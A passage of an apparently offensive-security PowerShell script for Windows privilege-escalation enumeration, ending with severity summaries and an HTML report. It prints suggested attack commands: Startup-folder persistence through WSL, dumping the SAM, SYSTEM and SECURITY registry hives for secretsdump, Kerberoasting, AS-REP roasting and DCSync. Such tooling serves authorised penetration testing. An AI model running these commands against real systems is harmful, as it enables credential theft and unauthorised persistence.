
SubSection "4. WSL Exploitation (If WSL Available)"
Cmd "# Startup folder persistence (works even without admin!):"
Cmd "wsl cat > '/mnt/host/c/Users/$env:USERNAME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/persist.bat' << 'EOF'"
Cmd "@echo off"
Cmd "echo Persistence active > C:\Windows\Temp\wsl_persist.txt"
Cmd "del \"%~f0\""
Cmd "EOF"
Cmd ""
Cmd "# Compile Windows exploit in WSL:"
Cmd "wsl sudo apt install mingw-w64 -y"
Cmd "wsl x86_64-w64-mingw32-gcc exploit.c -o exploit.exe"
Cmd "wsl cp exploit.exe /mnt/host/c/Windows/Temp/"
Cmd ""
Cmd "# Note: Creating Windows users requires admin even from WSL"

SubSection "5. Registry Hives (If Backup privilege)"
Cmd "reg save HKLM\SAM sam.hiv"
Cmd "reg save HKLM\SYSTEM system.hiv"
Cmd "reg save HKLM\SECURITY security.hiv"
Cmd "secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL"

if ($cs.PartOfDomain) {
    SubSection "6. Domain Attacks"
    Cmd "# Kerberoasting:"
    Cmd "GetUserSPNs.py $($cs.Domain)/user:pass -dc-ip DC_IP -request -outputfile kerberoast.txt"
    Cmd ""
    Cmd "# AS-REP Roasting:"
    Cmd "GetNPUsers.py $($cs.Domain)/ -usersfile users.txt -dc-ip DC_IP -format hashcat"
    Cmd ""
    Cmd "# DCSync (if compromised DA):"
    Cmd "secretsdump.py $($cs.Domain)/admin:pass@DC_IP"
}

# ==================== FINDINGS SUMMARY ====================
Write-Host "`n" -NoNewline
Write-Host "======================================================================" -ForegroundColor Green
Write-Host "  FINDINGS SUMMARY" -ForegroundColor Green
Write-Host "======================================================================" -ForegroundColor Green

if ($script:Findings.Critical.Count -gt 0) {
    Write-Host "`n  [CRITICAL] Found $($script:Findings.Critical.Count) critical issues:" -ForegroundColor Red
    $script:Findings.Critical | Select-Object -First 5 | ForEach-Object { Write-Host "    * $_" -ForegroundColor Red }
}

if ($script:Findings.High.Count -gt 0) {
    Write-Host "`n  [HIGH] Found $($script:Findings.High.Count) high severity issues:" -ForegroundColor Yellow
    $script:Findings.High | Select-Object -First 5 | ForEach-Object { Write-Host "    * $_" -ForegroundColor Yellow }
}

if ($script:Findings.Medium.Count -gt 0) {
    Write-Host "`n  [MEDIUM] Found $($script:Findings.Medium.Count) medium severity issues" -ForegroundColor Cyan
}

Write-Host "`n======================================================================" -ForegroundColor Green
Write-Host "  Enumeration Complete!" -ForegroundColor Green
Write-Host "======================================================================" -ForegroundColor Green

# ==================== HTML EXPORT ====================
if ($ExportHTML) {
    Write-Host "`n[*] Generating HTML report..." -ForegroundColor Cyan
    
    $html = @"
<!DOCTYPE html>
<html>
<head>
    <title>PrivEsc Enumeration Report - $env:COMPUTERNAME</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #1e1e1e; color: #d4d4d4; }
        h1 { color: #ff6b6b; border-bottom: 2px solid #ff6b6b; }
        h2 { color: #51cf66; margin-top: 30px; }
        .critical { background: #c92a2a; color: white; padding: 10px; margin: 5px 0; border-radius: 5px; }
        .high { background: #f59f00; color: white; padding: 10px; margin: 5px 0; border-radius: 5px; }
        .medium { background: #228be6; color: white; padding: 10px; margin: 5px 0; border-radius: 5px; }
        .info { background: #2d2d2d; padding: 10px; margin: 5px 0; border-radius: 5px; }
        .command { background: #1a1a1a; padding: 5px 10px; font-family: 'Courier New', monospace; margin: 5px 0; border-left: 3px solid #51cf66; }
        .summary { background: #2d2d2d; padding: 20px; margin: 20px 0; border-radius: 10px; border: 2px solid #51cf66; }
    </style>
</head>
<body>
    <h1>Privilege Escalation Enumeration Report</h1>
    <div class="info">
        <strong>Computer:</strong> $env:COMPUTERNAME<br>
        <strong>User:</strong> $env:USERDOMAIN\$env:USERNAME<br>
        <strong>Date:</strong> $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")<br>
        <strong>OS:</strong> $($os.Caption) Build $($os.BuildNumber)
    </div>
    
    <div class="summary">
        <h2>Findings Summary</h2>
        <p><strong>Critical Issues:</strong> $($script:Findings.Critical.Count)</p>
        <p><strong>High Severity:</strong> $($script:Findings.High.Count)</p>
        <p><strong>Medium Severity:</strong> $($script:Findings.Medium.Count)</p>
    </div>
    
    <h2>Critical Findings</h2>
"@
    
    foreach ($finding in $script:Findings.Critical) {
        $html += "<div class='critical'>$finding</div>`n"
    }
    
    $html += "<h2>High Severity Findings</h2>`n"
    foreach ($finding in $script:Findings.High) {
        $html += "<div class='high'>$finding</div>`n"
    }
    
    $html += "</body></html>"
    
    $html | Out-File $OutputFile -Encoding UTF8
    Write-Host "[+] Report saved to: $OutputFile" -ForegroundColor Green
    
    # Try to open in browser
    try {
        Start-Process $OutputFile
    } catch {}
}

Write-Host ""